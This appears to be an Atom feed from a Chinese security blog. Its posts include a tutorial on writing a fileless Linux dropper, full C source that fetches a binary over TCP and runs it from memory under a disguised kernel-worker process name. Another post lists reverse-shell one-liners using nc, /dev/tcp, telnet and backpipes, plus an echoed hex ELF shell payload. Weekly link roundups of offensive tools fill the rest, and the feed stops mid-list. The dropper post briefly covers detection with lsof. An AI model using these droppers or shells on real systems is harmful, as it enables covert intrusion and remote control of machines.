<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>M0rk&#39;s Blog</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://kevien.github.io/"/>
  <updated>2018-02-20T04:08:28.000Z</updated>
  <id>http://kevien.github.io/</id>
  
  <author>
    <name>M0rk</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>linux一种无文件后门技巧</title>
    <link href="http://kevien.github.io/2018/02/20/linux%E4%B8%80%E7%A7%8D%E6%97%A0%E6%96%87%E4%BB%B6%E5%90%8E%E9%97%A8%E6%8A%80%E5%B7%A7/"/>
    <id>http://kevien.github.io/2018/02/20/linux一种无文件后门技巧/</id>
    <published>2018-02-20T03:51:50.000Z</published>
    <updated>2018-02-20T04:08:28.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="TD-DR"><a href="#TD-DR" class="headerlink" title="TD;DR"></a>TD;DR</h4><ul>
<li><p>几周之前我看了这篇<a href="https://blog.gdssecurity.com/labs/2017/9/5/linux-based-inter-process-code-injection-without-ptrace2.html" target="_blank" rel="external">文章</a>,介绍的是不使用ptrace来进行linux进程注入的(使用ptrace进行进程注入的文章可以看向这里<a href="https://kevien.github.io/2018/01/28/linux进程注入/">linux进程注入</a>)，这篇文章很有意思建议你读一下，但引起我关注是的文末的一句话</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">The current payload in use is a simple open/memfd_create/sendfile/fexecve program</div></pre></td></tr></table></figure>
</li>
<li><p>我之前没有听过memfd_create和fexecve…就是这里引发了我的好奇，我决定学习和研究一下。</p>
</li>
<li>这篇文章我们将要讨论一下怎么利用这两个函数来开发一个超级隐蔽的dropper，你可以认为这是一个恶意软件开发的教程，但是开发和发布恶意软件是违法的：），此文仅做教学使用，因为最终恶意软件分析师需要去了解恶意软件开发者是怎么利用的，好让我们能更好的去检测它，从而使我们的系统更加安全。<h4 id="memfd-create-和-fexecve"><a href="#memfd-create-和-fexecve" class="headerlink" title="memfd_create 和 fexecve"></a>memfd_create 和 fexecve</h4></li>
<li>当读完这句有意思的话之后，我google了这两个函数，我发现功能确实强大，第一个允许我们在内存中创建一个文件，我们之前讨论过这个<a href="https://0x00sec.org/t/running-binaries-without-leaving-tracks/2166" target="_blank" rel="external">话题</a>,之前我们是使用/dev/shm来存放的文件，这个文件夹存放在内存中，我们写在这里的东西都不会保存到硬盘上，然而，我们还是可以通过ls看到它。</li>
<li>memfd_create 能做同样的事情，但是它在内存中的存储并不会被映射到文件系统中，因此不能简单的通过ls命令进行查看。</li>
<li>第二个函数，fexecve同样的功能很强大，它能使我们执行一个程序（同execve），但是传递给这个函数的是文件描述符，而不是文件的绝对路径，也就是说搭配起来memfd_create使用简直完美！</li>
<li>但是这里有一个需要注意的地方就是，因为这两个函数相对的比较新，memfd_create 是在kernel3.17才被引进来，fexecve是libc的一个函数，是在版本2.3.2之后才有的，当然没有fexecve的时候，我们也可以使用其它方式去取代它（后面会讨论），而memfd_create只能用在相对较新的linux内核系统上。</li>
<li>这意味着至少在现在，这个技巧在一些运行着老内核和没有libc的嵌入式设备上是不可行的，我没有测试一些路由器和安卓设备上是否存在fexecve函数，我觉得是没有的，如有人知道，请在评论处告知；）<h4 id="一个简单的dropper"><a href="#一个简单的dropper" class="headerlink" title="一个简单的dropper"></a>一个简单的dropper</h4></li>
<li>为了了解这两个函数是怎么工作的，我写了一个简单的dropper，这个dropper可以下载远程服务器上的二进制文件并且直接在内存中运行，不会存取在磁盘上。</li>
<li>在这之前，我们先来看看之前文章中讨论过的<a href="https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966" target="_blank" rel="external">Hajime</a>这个例子,这个例子使用了一行shell命令来创建一个文件（‘继承‘了另外一个文件的可执行权限）并且执行它然后再删除它。如果你不想打开链接，我之前把这行shell搬过来<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cp .s .i; &gt;.i; ./.s&gt;.i; ./.i; rm .s; /bin/busybox ECCHI</div></pre></td></tr></table></figure>
</li>
</ul>
<p>我们将要创建一个新的.s,一旦执行，将会达到执行类型上面一行shell同样的效果。</p>
<ul>
<li><p>让我们先来看一下这个代码吧</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line"></div><div class="line">#include &lt;sys/syscall.h&gt;</div><div class="line"></div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;sys/types.h&gt;</div><div class="line">#include &lt;sys/socket.h&gt;</div><div class="line">#include &lt;arpa/inet.h&gt;</div><div class="line"></div><div class="line">#define __NR_memfd_create 319</div><div class="line">#define MFD_CLOEXEC 1</div><div class="line"></div><div class="line">static inline int memfd_create(const char *name, unsigned int flags) &#123;</div><div class="line">    return syscall(__NR_memfd_create, name, flags);</div><div class="line">&#125;</div><div class="line"></div><div class="line">extern char        **environ;</div><div class="line"></div><div class="line">int main (int argc, char **argv) &#123;</div><div class="line">  int                fd, s;</div><div class="line">  unsigned long      addr = 0x0100007f11110002;</div><div class="line">  char               *args[2]= &#123;&quot;[kworker/u!0]&quot;, NULL&#125;;</div><div class="line">  char               buf[1024];</div><div class="line"></div><div class="line">  // Connect</div><div class="line">  if ((s = socket (PF_INET, SOCK_STREAM, IPPROTO_TCP)) &lt; 0) exit (1);</div><div class="line">  if (connect (s, (struct sockaddr*)&amp;addr, 16) &lt; 0) exit (1);</div><div class="line">  if ((fd = memfd_create(&quot;a&quot;, MFD_CLOEXEC)) &lt; 0) exit (1);</div><div class="line"></div><div class="line">  while (1) &#123;</div><div class="line">      if ((read (s, buf, 1024) ) &lt;= 0) break;</div><div class="line">      write (fd, buf, 1024);</div><div class="line">    &#125;</div><div class="line">  close (s);</div><div class="line">  </div><div class="line">  if (fexecve (fd, args, environ) &lt; 0) exit (1);</div><div class="line"></div><div class="line">  return 0;</div><div class="line">    </div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>代码很短也很简单，但是这里有几个点需要稍微介绍一下。</p>
<h4 id="调用memfd-create"><a href="#调用memfd-create" class="headerlink" title="调用memfd_create"></a>调用memfd_create</h4></li>
<li>第一个要介绍的就是，libc并没有对memfd_create这个系统调用进行封装（你可以在这里看到这个系统调用的相关信息<a href="http://man7.org/linux/man-pages/man2/memfd_create.2.html#NOTES" target="_blank" rel="external">memfd_create manpage’s NOTES section</a>）,这就意味着我们需要自己去封装一下。</li>
<li>首先我们需要找到memfd_create在系统调用中的索引，通过一些在线的系统调用表，这个索引在不同的架构下是不同的，如果你想将上面的代码应用在ARM和MIPS上,可能需要不同的索引，在X86_64系统架构下的索引是319.</li>
<li>我们使用了libc的syscall去对memfd_create进行了封装。</li>
<li>这个程序主要做了下面的事情</li>
<li>1.创建了一个TCP socket</li>
<li><p>2，使用AF_INET连接了127.0.0.1的0x1111端口，我们可以把这些所有的打包到一个变量里面这样可以使我们的代码看起来更短一点儿，同样你也可以去修改成你想要的ip和端口。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">addr = 01 00 00  7f   1111  0002;</div><div class="line">        1. 0. 0.127   1111  0002;</div><div class="line">       +------------+------+----</div><div class="line">         IP Address | Port | Family</div></pre></td></tr></table></figure>
</li>
<li><p>3.创建一个内存文件</p>
</li>
<li>4.从socket读取数据写入到内存文件</li>
<li>5.一旦文件传输完毕，运行内存文件</li>
<li>是不是很简单粗暴；）<h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4></li>
<li>现在，让我们来测试一下，通过main函数里面那个long的变量我们知道，这个dropper将会去连接本地localhost(127.0.0.1)的0x1111端口，这里我们简单的使用nc模拟一个server。</li>
<li><p>在控制台我们运行下面的命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ cat /usr/bin/xeyes | nc -l $((0x1111))</div></pre></td></tr></table></figure>
</li>
<li><p>你可以选择任意你喜欢的二进制文件，我这里用的是eyes（一个小眼睛会跟踪鼠标的移动）这个linux自带的小程序。在另外的一个命令行界面我们运行我们的dropper，这个时候xeyes会弹出来。<br><img src="/2018/02/20/linux一种无文件后门技巧/xeye.png" alt=""></p>
<h4 id="检测这个dropper"><a href="#检测这个dropper" class="headerlink" title="检测这个dropper"></a>检测这个dropper</h4></li>
<li><p>查找这个进程比较困难，因为我们给这个进程起了一个kworker/u!0这样的名字，注意！在这里只是为了快速的去发现它，当然在实际情况中，你可以使用一个具有迷惑性的名字，比如说什么so的进程名来让它看起来像是个内核的合法进程，让我们来看一下ps的输出</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ ps axe</div><div class="line">(...)</div><div class="line"> 2126 ?        S      0:00 [kworker/0:0]</div><div class="line"> 2214 pts/0    S+     0:00 [kworker/u!0]</div><div class="line">(...)</div></pre></td></tr></table></figure>
</li>
<li><p>你可以看到上面的一行中是一个合法的kworker进程，下面的就是我们的看似合法的进程。</p>
<h4 id="看不见的文件"><a href="#看不见的文件" class="headerlink" title="看不见的文件"></a>看不见的文件</h4></li>
<li>我们之前提到的memfd_create 将会在RAM文件系统中创建文件且不会映射到一般的文件系统，至少，如果映射了，我是没找到，所以现在看来这的确是相当猥琐的。</li>
<li>然而，事实上，如果一个文件存在，那么我们还是可以去发现它的，谁会去调用这个文件呢，没错，我们可以通过lsof(list of file)去查找：）到它<br><img src="/2018/02/20/linux一种无文件后门技巧/lsof.png" alt=""></li>
<li>注意lsof同样可以会显示出进程id，所以我们之前用的伪装的进程名在这个时候也就没有用了。<h4 id="如果系统中没有memfd-open不存在呢"><a href="#如果系统中没有memfd-open不存在呢" class="headerlink" title="如果系统中没有memfd_open不存在呢"></a>如果系统中没有memfd_open不存在呢</h4></li>
<li>我之前提到过memfd_open只是存在于内核在3.17或者更高的版本中，那在其它的版本中该怎么办，这种情况下我们可以使用另外一种没那么猥琐但是可以达到同样效果的方法。</li>
<li>我们最好的方式是使用shm_open(shared memory open)，这个函数会在/dev/shm文件夹下创建文件，然而，这个使用ls命令是可以看的到的，但是至少还是避免了写文件到磁盘了，shm_open和open的区别仅仅是不是在/dev/shm创建文件。</li>
<li>使用shm_open去修改这个dropper我们需要去做两件事情</li>
<li><p>1.首先我们需要去使用shm_open去代替memfd_create像是这样</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">(...)</div><div class="line">if ((fd = shm_open(&quot;a&quot;, O_RDWR | O_CREAT, S_IRWXU)) &lt; 0) exit (1);</div><div class="line">(...)</div></pre></td></tr></table></figure>
</li>
<li><p>2.第二件事情就是我们需要关闭这个文件，然后去重新打开是为了能够通过fexecve去执行它，所以在while接收完文件之后我们需要关闭文件，然后重启新开文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">(...)</div><div class="line">  close (fd);</div><div class="line"></div><div class="line">  if ((fd = shm_open(&quot;a&quot;, O_RDONLY, 0)) &lt; 0) exit (1);</div><div class="line">(...)</div></pre></td></tr></table></figure>
</li>
<li><p>然而，主要注意的是，这个时候我们完全可以使用execve去替代fexecve去达到同样的效果。</p>
<h4 id="那如果fexecve不存在呢"><a href="#那如果fexecve不存在呢" class="headerlink" title="那如果fexecve不存在呢"></a>那如果fexecve不存在呢</h4></li>
<li><p>当你知道fexecve是怎么工作的，这个就很简单，怎么去知道这个函数是怎么工作的，google一下看看源代码，man page有一个提示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">NOTES</div><div class="line">On Linux, fexecve() is implemented using the proc(5) file system, so /proc needs to be mounted and available at the time of the call.</div></pre></td></tr></table></figure>
</li>
<li><p>所以fexecve需要系统存在/proc的目录。让我们看看能不能自己实现一下。我们知道每个进程在虚拟目录proc下都有一个数字文件目录与之相对，所以这个时候，我们可以基本上使用下面的封装函数来实现fexecve的功能：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">int</div><div class="line">my_fexecve (int fd, char **arg, char **env) &#123;</div><div class="line">  char  fname[1024];</div><div class="line"></div><div class="line">  snprintf (fname, 1024, &quot;/proc/%d/fd/%d&quot;, getpid(), fd);</div><div class="line">  execve (fname, arg, env);</div><div class="line">  return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><ul>
<li>读完这篇文章，你应该了解了之前提到的open/memfdcreate/sendfile/fexecve这几个函数。</li>
<li>这篇文章中作者是以打开xeye程序为示例，还有其它猥琐的利用场景,你想到了吗？<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4></li>
<li><a href="https://0x00sec.org/t/super-stealthy-droppers/3715" target="_blank" rel="external">Super-Stealthy Droppers</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;TD-DR&quot;&gt;&lt;a href=&quot;#TD-DR&quot; class=&quot;headerlink&quot; title=&quot;TD;DR&quot;&gt;&lt;/a&gt;TD;DR&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;几周之前我看了这篇&lt;a href=&quot;https://blog.gdssecurity.com/la
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20180214安全动态</title>
    <link href="http://kevien.github.io/2018/02/14/20180214%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2018/02/14/20180214安全动态/</id>
    <published>2018-02-14T04:21:49.000Z</published>
    <updated>2018-02-14T08:52:09.823Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每周安全动态"><a href="#每周安全动态" class="headerlink" title="每周安全动态"></a>每周安全动态</h4><ul>
<li>Docker 微服务教程<br><a href="http://www.ruanyifeng.com/blog/2018/02/docker-wordpress-tutorial.html" target="_blank" rel="external">http://www.ruanyifeng.com/blog/2018/02/docker-wordpress-tutorial.html</a></li>
<li>渗透技巧——Windows下的剪贴板<br><a href="http://www.4hou.com/technology/10253.html" target="_blank" rel="external">http://www.4hou.com/technology/10253.html</a></li>
<li>HTA encryption tool for RedTeams<br><a href="https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2017/august/smuggling-hta-files-in-internet-exploreredge/" target="_blank" rel="external">https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2017/august/smuggling-hta-files-in-internet-exploreredge/</a></li>
<li>Stealing SSH credentials via a Python PAM module<br><a href="https://github.com/mthbernardes/sshLooter" target="_blank" rel="external">https://github.com/mthbernardes/sshLooter</a></li>
<li>关于浏览器安全的会议ppt<br><a href="https://www.kanxue.com/book-9-208.htm" target="_blank" rel="external">https://www.kanxue.com/book-9-208.htm</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每周安全动态&quot;&gt;&lt;a href=&quot;#每周安全动态&quot; class=&quot;headerlink&quot; title=&quot;每周安全动态&quot;&gt;&lt;/a&gt;每周安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Docker 微服务教程&lt;br&gt;&lt;a href=&quot;http://www.ruanyifeng.c
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20180206安全动态</title>
    <link href="http://kevien.github.io/2018/02/06/20180206%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2018/02/06/20180206安全动态/</id>
    <published>2018-02-05T16:01:38.000Z</published>
    <updated>2018-02-09T16:04:49.089Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每周安全动态"><a href="#每周安全动态" class="headerlink" title="每周安全动态"></a>每周安全动态</h4><ul>
<li>APTSimulator - 一个批处理脚本，快速将 Windows 系统改造成被 APT 入侵过的环境，用于安全产品测试等需求<br><a href="https://github.com/Neo23x0/APTSimulator" target="_blank" rel="external">https://github.com/Neo23x0/APTSimulator</a></li>
<li>Sickle - shellcode 辅助开发工具<br><a href="https://github.com/wetw0rk/Sickle" target="_blank" rel="external">https://github.com/wetw0rk/Sickle</a></li>
<li>Evilgrade - 专门用来攻击常用软件更新的框架，劫持常用软件的更新信道，替换为指定的二进制文件<br><a href="https://github.com/infobyte/evilgrade" target="_blank" rel="external">https://github.com/infobyte/evilgrade</a></li>
<li>IDA Pro 的官方推出了 7.0 的免费版本，支持 Windows、macOS、Linux 三个平台<br><a href="https://www.hex-rays.com/products/ida/support/download_freeware.shtml" target="_blank" rel="external">https://www.hex-rays.com/products/ida/support/download_freeware.shtml</a></li>
<li>ToolAnalysisResultSheet - 日本 CERT（jpcert）总结的 49 个常用工具（PsExec、wmic、schtasks、PWDump7 等）在执行后会留下的系统痕迹，这些记录可以被用于判断机器是否被入侵过<br><a href="https://jpcertcc.github.io/ToolAnalysisResultSheet/" target="_blank" rel="external">https://jpcertcc.github.io/ToolAnalysisResultSheet/</a></li>
<li>在 XML 中使用两种编码以绕过 WAF 检测<br><a href="https://mohemiv.com/all/evil-xml/" target="_blank" rel="external">https://mohemiv.com/all/evil-xml/</a></li>
<li>二进制漏洞利用开发教程<br><a href="https://0x00sec.org/t/getting-cozy-with-exploit-development/5311" target="_blank" rel="external">https://0x00sec.org/t/getting-cozy-with-exploit-development/5311</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每周安全动态&quot;&gt;&lt;a href=&quot;#每周安全动态&quot; class=&quot;headerlink&quot; title=&quot;每周安全动态&quot;&gt;&lt;/a&gt;每周安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;APTSimulator - 一个批处理脚本，快速将 Windows 系统改造成被 APT 入侵
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>reverse shell的几种方式</title>
    <link href="http://kevien.github.io/2018/01/30/reverse-shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/"/>
    <id>http://kevien.github.io/2018/01/30/reverse-shell的几种方式/</id>
    <published>2018-01-30T07:58:01.000Z</published>
    <updated>2018-02-04T10:27:43.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><ul>
<li>这篇文章主要介绍一下几种通过linux内置工具得到reverse shell的几种方法。</li>
<li>linux(GNUx)有很多的发行版，不同的发现版之前的内置工具、安全机制等都有所不同。</li>
<li>下文中的几个例子一般在大多数的系统中是通用的。</li>
<li>这里主要重点关注一下4和5<h4 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h4></li>
<li>要求能够使用者能够在目标机器上运行一些基本的命令。<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4></li>
<li>下面的一些例子中使用A代表攻击者（Attacker），T代表Target（目标）<h2 id="1-netcat"><a href="#1-netcat" class="headerlink" title="1.netcat"></a>1.netcat</h2></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nc &lt;attacker_ip&gt; &lt;port&gt; -e /bin/bash 	# T</div><div class="line">nc -n -vv -l -p &lt;port&gt;					# A</div></pre></td></tr></table></figure>
<ul>
<li>现在的netcat版本可能没有-e参数。<h2 id="2-netcat-e被禁用或者没有-e参数"><a href="#2-netcat-e被禁用或者没有-e参数" class="headerlink" title="2.netcat -e被禁用或者没有-e参数"></a>2.netcat -e被禁用或者没有-e参数</h2></li>
<li>那么可以使用下面的命令</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mknod backpipe p; nc &lt;attacker_ip&gt; &lt;port&gt; 0&lt;backpipe | /bin/bash 1&gt;backpipe    # T</div><div class="line">nc -n -vv -l -p &lt;port&gt;	# A</div></pre></td></tr></table></figure>
<p><img src="/2018/01/30/reverse-shell的几种方式/2.png" alt=""></p>
<h2 id="3-不使用netcat"><a href="#3-不使用netcat" class="headerlink" title="3.不使用netcat"></a>3.不使用netcat</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">/bin/bash -i &gt; /dev/tcp/&lt;attacker_ip&gt;/&lt;port&gt; 0&lt;&amp;1 2&gt;&amp;1      # T</div><div class="line">nc -n -vv -l -p &lt;port&gt; 	# A</div></pre></td></tr></table></figure>
<ul>
<li>这个也是大多数人用的方式，这种方式使用了/dev/tcp套接字的编程特性，重定向/bin/bash到远程系统<h2 id="4-不使用netcat和-dev-tcp"><a href="#4-不使用netcat和-dev-tcp" class="headerlink" title="4.不使用netcat和/dev/tcp"></a>4.不使用netcat和/dev/tcp</h2></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mknod backpipe p &amp;&amp; telnet &lt;attacker_ip&gt; &lt;port&gt; 0&lt;backpipe | /bin/bash 1&gt;backpipe	    # T</div><div class="line">nc -n -vv -l -p &lt;port&gt; 	# A</div></pre></td></tr></table></figure>
<p><img src="/2018/01/30/reverse-shell的几种方式/4.png" alt=""></p>
<ul>
<li>使用telnet代替nc<h2 id="5-telnet-to-telnet"><a href="#5-telnet-to-telnet" class="headerlink" title="5.telnet to telnet"></a>5.telnet to telnet</h2></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">telnet &lt;attacker_ip&gt; &lt;1st_port&gt; | /bin/bash | telnet &lt;attacker_ip&gt; &lt;2nd_port&gt;     # T</div><div class="line">nc -n -vv -l -p &lt;1st_port&gt; 	# A1</div><div class="line">nc -n -vv -l -p &lt;2nd_port&gt;	# A2</div></pre></td></tr></table></figure>
<p><img src="/2018/01/30/reverse-shell的几种方式/5.png" alt=""></p>
<ul>
<li>这第五个其实挺有意思的。这里用了两个telnet的会话去连接到了远程的ip，其中第一个会话用来输入命令，第二个会话用来显示命令执行后的结果<h2 id="6-机器码"><a href="#6-机器码" class="headerlink" title="6.机器码"></a>6.机器码</h2></li>
<li>这里的shellcode可以使用msf生成<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nc -v -l 1337             # Attacker</div><div class="line">echo -e &quot;\x7F\x45\x4C\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x03\x00\x01\x00\x00\x00\x60\x80\x04\x08\x34\x00\x00\x00\xBC\x00\x00\x00\x00\x00\x00\x00\x34\x00\x20\x00\x01\x00\x28\x00\x03\x00\x02\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x04\x08\x00\x80\x04\x08\xAA\x00\x00\x00\xAA\x00\x00\x00\x05\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x6A\x66\x58\x6A\x01\x5B\x31\xD2\x52\x53\x6A\x02\x89\xE1\xCD\x80\x92\xB0\x66\x68\x7F\x01\x01\x01\x66\x68\x05\x39\x43\x66\x53\x89\xE1\x6A\x10\x51\x52\x89\xE1\x43\xCD\x80\x6A\x02\x59\x87\xDA\xB0\x3F\xCD\x80\x49\x79\xF9\xB0\x0B\x41\x89\xCA\x52\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\xCD\x80\x00\x2E\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2E\x74\x65\x78\x74\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0B\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\x60\x80\x04\x08\x60\x00\x00\x00\x4A\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xAA\x00\x00\x00\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00&quot; &gt; c; chmod +x c;./c &amp; rm c  # Target</div></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><ul>
<li>这里只是一些小技巧，我希望在我们遇到比如某些命令在某个系统中不能使用的时候，或许我们可以发现并使用其它的方式，可以达到同样的效果，而不是在一棵树上吊死<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4></li>
<li><a href="https://0x00sec.org/t/spawning-reverse-shells/2133" target="_blank" rel="external">Spawning reverse shells</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;这篇文章主要介绍一下几种通过linux内置工具得到reverse shell的几种方法。&lt;/li&gt;
&lt;li&gt;linux(GNUx
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20180129安全动态</title>
    <link href="http://kevien.github.io/2018/01/29/20180129%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2018/01/29/20180129安全动态/</id>
    <published>2018-01-29T04:52:57.000Z</published>
    <updated>2018-02-01T10:24:35.232Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每周安全动态"><a href="#每周安全动态" class="headerlink" title="每周安全动态"></a>每周安全动态</h4><ul>
<li>Linux boot process 分析<br><a href="https://opensource.com/article/18/1/analyzing-linux-boot-process" target="_blank" rel="external">https://opensource.com/article/18/1/analyzing-linux-boot-process</a></li>
<li>使用 RADARE 进行逆向工程之基础入门<br><a href="https://pixl.dy.fi/posts/2018-01-22-reverse-engineering-basics-with-radare-fundamentals-and-basics/" target="_blank" rel="external">https://pixl.dy.fi/posts/2018-01-22-reverse-engineering-basics-with-radare-fundamentals-and-basics/</a></li>
<li>dnscrypt-proxy - 一款 DNS 代理，支持加密的 DNS 协议<br><a href="https://github.com/jedisct1/dnscrypt-proxy" target="_blank" rel="external">https://github.com/jedisct1/dnscrypt-proxy</a></li>
<li>命令行下的“蒙面歌王”rundll32.exe<br><a href="http://www.freebuf.com/sectool/160696.html" target="_blank" rel="external">http://www.freebuf.com/sectool/160696.html</a></li>
<li>如何做好首席安全官 – 企业安全体系与架构实现<br><a href="https://www.sec-un.org/%E5%A6%82%E4%BD%95%E5%81%9A%E5%A5%BD%E9%A6%96%E5%B8%AD%E5%AE%89%E5%85%A8%E5%AE%98-%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E4%BD%93%E7%B3%BB%E4%B8%8E%E6%9E%B6%E6%9E%84%E5%AE%9E%E7%8E%B0/" target="_blank" rel="external">https://www.sec-un.org/%E5%A6%82%E4%BD%95%E5%81%9A%E5%A5%BD%E9%A6%96%E5%B8%AD%E5%AE%89%E5%85%A8%E5%AE%98-%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E4%BD%93%E7%B3%BB%E4%B8%8E%E6%9E%B6%E6%9E%84%E5%AE%9E%E7%8E%B0/</a></li>
<li>Cisco ASA 实验环境的搭建，来自 NCC Group<br><a href="https://github.com/nccgroup/asatools/blob/master/tutorial.md" target="_blank" rel="external">https://github.com/nccgroup/asatools/blob/master/tutorial.md</a></li>
<li>IoT ARM 漏洞利用开发介绍<br><a href="https://www.exploit-db.com/docs/english/43906-arm-exploitation-for-iot.pdf" target="_blank" rel="external">https://www.exploit-db.com/docs/english/43906-arm-exploitation-for-iot.pdf</a></li>
<li>wavecrack - 调用 Hashcat 进行密码破解的 Web 操作接口<br><a href="https://github.com/wavestone-cdt/wavecrack" target="_blank" rel="external">https://github.com/wavestone-cdt/wavecrack</a></li>
<li>Metasploit 框架新集成了 MS17-010 EternalSynergy Exploits，该 Exploits 支持 Windows 2000 到 Windows Server 2016 的所有版本，非常稳定<br><a href="https://github.com/rapid7/metasploit-framework/pull/9473" target="_blank" rel="external">https://github.com/rapid7/metasploit-framework/pull/9473</a></li>
